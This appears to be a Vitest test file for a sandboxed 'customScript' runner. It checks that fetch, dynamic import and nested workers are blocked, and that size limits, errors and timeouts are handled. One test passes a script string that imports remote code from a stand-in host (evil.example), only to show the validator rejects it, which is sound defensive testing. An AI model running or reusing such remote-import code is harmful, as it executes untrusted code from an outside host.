import { describe, it, expect, vi, beforeEach } from 'vitest'
import {
  runCustomScript,
  validateCustomScript,
  CUSTOM_SCRIPT_MAX_BYTES,
  CUSTOM_SCRIPT_HELPERS,
} from '../../src/tools/customScript'

class MockWorker {
  onmessage: ((e: MessageEvent) => void) | null = null
  onerror: (() => void) | null = null

  postMessage(data: { code: string; input: string; config: Record<string, string> }) {
    queueMicrotask(async () => {
      try {
        const fn = new Function(
          'input',
          'config',
          'helpers',
          'fetch',
          'dynamicImport',
          'Worker',
          'SharedWorker',
          'return (async () => {\n' + data.code + '\n})()'
        )
        const blockedFetch = () => {
          throw new Error('Network is not available in Custom Script')
        }
        const blockedImport = () => {
          throw new Error('Dynamic import is blocked in Custom Script')
        }
        const blockedWorker = () => {
          throw new Error('Nested workers are blocked in Custom Script')
        }
        const result = await fn(
          data.input,
          data.config,
          CUSTOM_SCRIPT_HELPERS,
          blockedFetch,
          blockedImport,
          blockedWorker,
          blockedWorker
        )
        this.onmessage?.({
          data: { ok: true, result: result == null ? '' : String(result) },
        } as MessageEvent)
      } catch (err) {
        this.onmessage?.({
          data: {
            ok: false,
            error: err instanceof Error ? err.message : String(err),
          },
        } as MessageEvent)
      }
    })
  }

  terminate() {}
}

describe('customScript', () => {
  beforeEach(() => {
    vi.stubGlobal('Worker', MockWorker)
    vi.stubGlobal('URL', {
      createObjectURL: vi.fn(() => 'blob:mock'),
      revokeObjectURL: vi.fn(),
    })
  })
  it('validates script size', () => {
    expect(() => validateCustomScript('')).toThrow(/empty/)
    expect(() => validateCustomScript('x'.repeat(CUSTOM_SCRIPT_MAX_BYTES + 1))).toThrow(/byte limit/)
  })

  it('runs script in worker and returns string', async () => {
    const result = await runCustomScript('hello', {
      script: 'return helpers.trim(input)',
    })
    expect(result).toBe('hello')
  })

  it('blocks fetch in the worker sandbox', async () => {
    await expect(
      runCustomScript('x', { script: 'await fetch("https://example.com"); return "nope"' })
    ).rejects.toThrow(/Network is not available/)
  })

  it('rejects import() in script source', () => {
    expect(() =>
      validateCustomScript('await import("https://evil.example/x.js"); return "nope"')
    ).toThrow(/import/i)
  })

  it('surfaces script errors', async () => {
    await expect(
      runCustomScript('x', { script: 'throw new Error("boom")' })
    ).rejects.toThrow(/boom/)
  })

  it('uses config.script default when missing', async () => {
    await expect(runCustomScript('x', {})).rejects.toThrow(/empty/)
  })

  it('handles worker message edge cases', async () => {
    class NullResultWorker {
      onmessage: ((e: MessageEvent) => void) | null = null
      postMessage() {
        this.onmessage?.({ data: { ok: true, result: undefined } } as MessageEvent)
      }
      terminate() {}
    }
    vi.stubGlobal('Worker', NullResultWorker)
    vi.stubGlobal('URL', {
      createObjectURL: vi.fn(() => 'blob:mock'),
      revokeObjectURL: vi.fn(),
    })
    await expect(runCustomScript('x', { script: 'return null' })).resolves.toBe('')

    class FailWorker {
      onmessage: ((e: MessageEvent) => void) | null = null
      postMessage() {
        this.onmessage?.({ data: { ok: false } } as MessageEvent)
      }
      terminate() {}
    }
    vi.stubGlobal('Worker', FailWorker)
    await expect(runCustomScript('x', { script: 'bad' })).rejects.toThrow(/Custom script failed/)
  })

  it('times out long-running scripts', async () => {
    vi.useFakeTimers()
    class SlowWorker {
      onmessage: ((e: MessageEvent) => void) | null = null
      postMessage() {
        /* never responds */
      }
      terminate() {}
    }
    vi.stubGlobal('Worker', SlowWorker)
    vi.stubGlobal('URL', {
      createObjectURL: vi.fn(() => 'blob:mock'),
      revokeObjectURL: vi.fn(),
    })
    const pending = runCustomScript('x', { script: 'while(true){}' })
    const assertion = expect(pending).rejects.toThrow(/timed out/)
    await vi.advanceTimersByTimeAsync(8_001)
    await assertion
    vi.useRealTimers()
  })

  it('handles worker errors', async () => {
    class ErrorWorker {
      onmessage: ((e: MessageEvent) => void) | null = null
      onerror: (() => void) | null = null
      postMessage() {
        this.onerror?.()
      }
      terminate() {}
    }
    vi.stubGlobal('Worker', ErrorWorker)
    await expect(runCustomScript('x', { script: 'return 1' })).rejects.toThrow(/worker error/)
  })
})
